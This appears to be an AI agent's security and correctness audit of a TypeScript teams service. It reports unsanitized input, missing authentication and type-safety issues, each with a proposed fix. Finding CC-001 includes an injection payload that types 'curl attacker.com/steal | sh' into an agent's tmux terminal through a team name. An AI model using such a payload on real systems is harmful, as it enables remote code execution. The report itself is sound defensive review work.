# Code Correctness Report: teams-service (Round 2 Independent Audit)

**Agent:** epcp-code-correctness-agent
**Domain:** services/teams-service.ts + lib/team-acl.ts + lib/validation.ts
**Files audited:** 3
**Date:** 2026-02-20T00:00:00Z

---

## Security Properties Table

| Function | ACL Check | UUID Validation | Awaits Async | Strips Governance Fields | Handles TeamValidationException |
|---|---|---|---|---|---|
| `listAllTeams` | NONE (intentional, Phase 1) | N/A (no ID param) | N/A (sync) | N/A | N/A |
| `createNewTeam` | NONE (no target team) | N/A (creates new) | YES (line 151) | N/A (passes type/COS to lib) | YES (line 159) |
| `getTeamById` | YES, unconditional (line 184) | YES (line 173) | N/A (sync) | N/A (read-only) | N/A (sync getTeam) |
| `updateTeamById` | YES, unconditional (line 211) | YES (line 199) | YES (line 219) | YES (line 207: type, chiefOfStaffId stripped) | YES (line 226) |
| `deleteTeamById` | YES, unconditional (line 251) + extra COS/MANAGER check (line 257-264) | YES (line 240) | YES (line 267) | N/A (delete op) | NO (deleteTeam does not throw TVE) |
| `listTeamTasks` | YES, unconditional (line 290) | NO (teamId not validated) | N/A (sync) | N/A | N/A |
| `createTeamTask` | YES, unconditional (line 313) | NO (teamId not validated) | YES (line 332) | N/A | NO (createTask may not throw TVE) |
| `updateTeamTask` | YES, unconditional (line 364) | NO (teamId, taskId not validated) | YES (line 397) | N/A | NO |
| `deleteTeamTask` | YES, unconditional (line 429) | NO (teamId, taskId not validated) | YES (line 434) | N/A | NO |
| `listTeamDocuments` | YES, unconditional (line 458) | NO (teamId not validated) | N/A (sync) | N/A | N/A |
| `createTeamDocument` | YES, unconditional (line 480) | NO (teamId not validated) | YES (line 492) | N/A | NO |
| `getTeamDocument` | YES, unconditional (line 518) | NO (teamId, docId not validated) | N/A (sync) | N/A | N/A |
| `updateTeamDocument` | YES, unconditional (line 549) | NO (teamId, docId not validated) | YES (line 561) | N/A | NO |
| `deleteTeamDocument` | YES, unconditional (line 585) | NO (teamId, docId not validated) | YES (line 590) | N/A | NO |
| `notifyTeamAgents` | NONE (no team target) | NO (agentIds not validated) | YES (line 617) | N/A | N/A |

---

## MUST-FIX

### [CC-001] Command injection via teamName in notifyTeamAgents notification path
- **File:** `/Users/emanuelesabetta/ai-maestro/services/teams-service.ts`:605-647
- **Severity:** MUST-FIX
- **Category:** security
- **Confidence:** CONFIRMED (traced full call chain)
- **Description:** `notifyTeamAgents` accepts `teamName` from the request body (line 606) and uses it unsanitized in a tmux notification (line 631: `subject: \`Team "${teamName}" is starting\``). The subject flows to `formatNotification` -> `sendTmuxNotification` -> `runtime.sendKeys` with `-l` (literal) flag. While single quotes are escaped, control characters (specifically newline `\x0A`) are NOT stripped. tmux `send-keys -l` sends a literal newline as an Enter keypress, which splits the typed command and allows injection of arbitrary shell commands into the target agent's terminal session.
- **Evidence:**
  ```
  // teams-service.ts:631
  subject: `Team "${teamName}" is starting`,

  // notification-service.ts:54-55
  const escapedMessage = message.replace(/'/g, "'\\''")
  await runtime.sendKeys(target, `echo '${escapedMessage}'`, { literal: true, enter: true })

  // agent-runtime.ts:180-184 (literal mode)
  const escaped = keys.replace(/'/g, "'\\''")
  await execAsync(`tmux send-keys -t "${name}" -l '${escaped}' \\; send-keys -t "${name}" Enter`)
  ```
  Attack payload: `teamName = "test\n; curl attacker.com/steal | sh\n; echo "` would type `echo 'Team "test` [Enter] `; curl attacker.com/steal | sh` [Enter] `; echo " is starting'` [Enter] into the target terminal.
- **Fix:** Strip control characters from `teamName` in `notifyTeamAgents` before passing to `notifyAgent`. Add: `const safeTeamName = teamName.replace(/[\x00-\x1F\x7F]/g, '')` before line 631. Also, the notification-service.ts `sendTmuxNotification` function should strip control characters as defense-in-depth.

### [CC-002] Double single-quote escaping in notification path produces garbled output
- **File:** `/Users/emanuelesabetta/ai-maestro/lib/notification-service.ts`:54 and `/Users/emanuelesabetta/ai-maestro/lib/agent-runtime.ts`:181
- **Severity:** MUST-FIX
- **Category:** logic
- **Confidence:** CONFIRMED (traced both escape sites)
- **Description:** The notification message is single-quote-escaped TWICE: once in `sendTmuxNotification` (notification-service.ts:54) and again in `sendKeys` (agent-runtime.ts:181). The first escape converts `'` to `'\''`. The second escape then converts each `'` in `'\''` to `'\''` again, resulting in `'\\'''\\'''\\'''` — a mangled string. Any notification containing a single quote (e.g., team name "Alice's Team") will display garbled text.
- **Evidence:**
  ```
  // notification-service.ts:54
  const escapedMessage = message.replace(/'/g, "'\\''")
  // Result for "Alice's Team": "Alice'\''s Team"

  // agent-runtime.ts:181
  const escaped = keys.replace(/'/g, "'\\''")
  // Result: "echo '\\''Alice'\\'''\\'''\\''s Team'\\'''"
  ```
- **Fix:** Remove the escape on line 54 of notification-service.ts — `sendKeys` with `literal: true` already handles escaping.

---

## SHOULD-FIX

### [CC-003] Missing UUID validation on teamId in task and document CRUD functions
- **File:** `/Users/emanuelesabetta/ai-maestro/services/teams-service.ts`:282, 304, 351, 421, 450, 471, 510, 535, 577
- **Severity:** SHOULD-FIX
- **Category:** api-contract
- **Confidence:** CONFIRMED
- **Description:** `getTeamById`, `updateTeamById`, and `deleteTeamById` all validate `id` with `isValidUuid()`, but the 9 task/document CRUD functions do NOT validate `teamId`. While the lib layer (`tasksFilePath`, `docsFilePath`) has its own UUID validation in try-catch blocks, the service layer silently swallows the error (returns empty results or "not found" instead of 400). Inconsistent error responses make debugging harder for API consumers. Additionally, `taskId` and `docId` are never validated at the service layer.
- **Evidence:**
  ```
  // These validate:
  getTeamById:    if (!isValidUuid(id)) { return { error: 'Invalid team ID format', status: 400 } }
  updateTeamById: if (!isValidUuid(id)) { return { error: 'Invalid team ID', status: 400 } }
  deleteTeamById: if (!isValidUuid(id)) { return { error: 'Invalid team ID', status: 400 } }

  // These do NOT validate:
  listTeamTasks(teamId, ...) — no isValidUuid check
  createTeamTask(teamId, ...) — no isValidUuid check
  // ... and 7 more functions
  ```
- **Fix:** Add `if (!isValidUuid(teamId)) return { error: 'Invalid team ID', status: 400 }` at the top of all 9 task/document functions. Also add validation for `taskId` and `docId` parameters.

### [CC-004] notifyTeamAgents route has no authentication
- **File:** `/Users/emanuelesabetta/ai-maestro/app/api/teams/notify/route.ts`:5-13
- **Severity:** SHOULD-FIX
- **Category:** security
- **Confidence:** CONFIRMED
- **Description:** The POST /api/teams/notify route has no `authenticateAgent` call, unlike the POST /api/teams route. Combined with CC-001 (command injection via teamName), any local process can inject commands into any agent's terminal session. In Phase 1 (localhost-only) this is lower severity, but it should be fixed before Phase 2.
- **Evidence:**
  ```
  // app/api/teams/notify/route.ts — NO auth check
  export async function POST(request: NextRequest) {
    const body = await request.json()
    const result = await notifyTeamAgents(body)
    ...
  }

  // Compare with app/api/teams/route.ts — HAS auth check
  export async function POST(request: NextRequest) {
    const auth = authenticateAgent(
      request.headers.get('Authorization'),
      request.headers.get('X-Agent-Id')
    )
    ...
  }
  ```
- **Fix:** Add `authenticateAgent` call to the notify route, matching the pattern in the team creation route.

### [CC-005] listAllTeams exposes all teams including closed teams without ACL check
- **File:** `/Users/emanuelesabetta/ai-maestro/services/teams-service.ts`:121-124
- **Severity:** SHOULD-FIX
- **Category:** security
- **Confidence:** CONFIRMED
- **Description:** `listAllTeams` returns all teams including closed teams with their full metadata (member lists, COS IDs, etc.) to any caller without any ACL check. While the route comment says "Phase 1: No ACL on team list", this leaks closed team membership information to unauthorized agents. The function signature doesn't even accept `requestingAgentId`.
- **Evidence:**
  ```typescript
  export function listAllTeams(): ServiceResult<{ teams: any[] }> {
    const teams = loadTeams()
    return { data: { teams }, status: 200 }
  }
  ```
- **Fix:** Either (a) filter out closed team details for non-members (return name/id only), or (b) accept `requestingAgentId` and apply per-team ACL filtering. At minimum, document this as an intentional Phase 1 trade-off.

---

## NIT

### [CC-006] createNewTeam accepts but ignores requestingAgentId
- **File:** `/Users/emanuelesabetta/ai-maestro/services/teams-service.ts`:53, 131-165
- **Severity:** NIT
- **Category:** api-contract
- **Confidence:** CONFIRMED
- **Description:** `CreateTeamParams` includes `requestingAgentId?: string` (line 53), and the route passes it via `{ ...body, requestingAgentId }` (route.ts:31). However, `createNewTeam` never uses this value — it's not destructured, not checked, and not passed to `createTeam`. The field exists in the interface but is dead code in the function body. This could cause confusion about whether team creation has identity-based restrictions.
- **Evidence:**
  ```typescript
  // Line 132: requestingAgentId is NOT destructured
  const { name, description, agentIds } = params
  // params.requestingAgentId exists but is never referenced
  ```
- **Fix:** Either (a) use `requestingAgentId` for audit logging or governance checks, or (b) remove it from `CreateTeamParams` and the route destructuring to avoid confusion.

### [CC-007] Inconsistent error messages for invalid team ID across functions
- **File:** `/Users/emanuelesabetta/ai-maestro/services/teams-service.ts`:174, 200, 241
- **Severity:** NIT
- **Category:** api-contract
- **Confidence:** CONFIRMED
- **Description:** `getTeamById` returns `'Invalid team ID format'` (line 174), while `updateTeamById` and `deleteTeamById` return `'Invalid team ID'` (lines 200, 241). Minor inconsistency but could confuse API consumers.
- **Evidence:**
  ```typescript
  // getTeamById
  return { error: 'Invalid team ID format', status: 400 }
  // updateTeamById & deleteTeamById
  return { error: 'Invalid team ID', status: 400 }
  ```
- **Fix:** Standardize to a single message, e.g., `'Invalid team ID format'`.

### [CC-008] Excessive use of `any` type in ServiceResult and return values
- **File:** `/Users/emanuelesabetta/ai-maestro/services/teams-service.ts`:121, 131, 171, 197, 282, 304, 351, 450, 471, 510, 535, 605
- **Severity:** NIT
- **Category:** type-safety
- **Confidence:** CONFIRMED
- **Description:** Nearly all service functions use `ServiceResult<{ team: any }>`, `ServiceResult<{ tasks: any[] }>`, etc. The `any` type defeats TypeScript's type checking and allows callers to access non-existent properties without compile-time errors. The actual types (`Team`, `Task`, `TeamDocument`) are available from the type imports.
- **Evidence:**
  ```typescript
  export function listAllTeams(): ServiceResult<{ teams: any[] }> { ... }
  export function getTeamById(...): ServiceResult<{ team: any }> { ... }
  // Team, Task, TeamDocument types are available but not used
  ```
- **Fix:** Replace `any` with the actual types: `ServiceResult<{ teams: Team[] }>`, `ServiceResult<{ team: Team }>`, `ServiceResult<{ tasks: Task[] }>`, `ServiceResult<{ document: TeamDocument }>`, etc.

---

## Attack Scenario Trace Results

### Scenario 1: updateTeamById with type='closed' and chiefOfStaffId='attacker'
- **Result:** SAFE. Line 207 strips `type` and `chiefOfStaffId` via destructuring: `const { requestingAgentId, type: _type, chiefOfStaffId: _cos, ...updateFields } = params`. Only `updateFields` (which excludes both governance fields) is passed to `updateTeam` on line 219. The attack fails silently — the fields are simply discarded.

### Scenario 2: Call any function with requestingAgentId=undefined
- **Result:** SAFE (by design). `checkTeamAccess` returns `{ allowed: true }` for `undefined` requestingAgentId (team-acl.ts:42-44). This is the documented Phase 1 behavior: web UI requests (no X-Agent-Id header) get full access because Phase 1 is localhost-only.
- **Exception:** `deleteTeamById` on a closed team additionally checks `!requestingAgentId` on line 258 and returns error 400 — requiring agent identity for closed team deletion even from web UI.

### Scenario 3: deleteTeamById on a closed team without auth
- **Result:** SAFE. Three layers of protection:
  1. ACL check (line 251): If requestingAgentId is a non-member, denied with 403.
  2. Identity check (line 258): If requestingAgentId is undefined (web UI), denied with 400.
  3. Role check (line 262): Only MANAGER or COS can delete closed teams. Regular members who pass ACL are blocked here.

### Scenario 4: SQL injection in name field
- **Result:** SAFE. No SQL database is used. Team names are stored as JSON in `~/.aimaestro/teams/teams.json`. The lib layer sanitizes team names via `sanitizeTeamName()` (team-registry.ts:36-41): strips control characters, collapses whitespace, trims. JSON.stringify/parse handles escaping for the file format.

---

## CLEAN

Files with no correctness issues found:
- `/Users/emanuelesabetta/ai-maestro/lib/team-acl.ts` — No issues. Logic is sound, decision order is correct, all paths return a result, the Phase 1 web-UI bypass is documented with TODO for Phase 2.
- `/Users/emanuelesabetta/ai-maestro/lib/validation.ts` — No issues. UUID regex is correct (case-insensitive, standard UUID format).
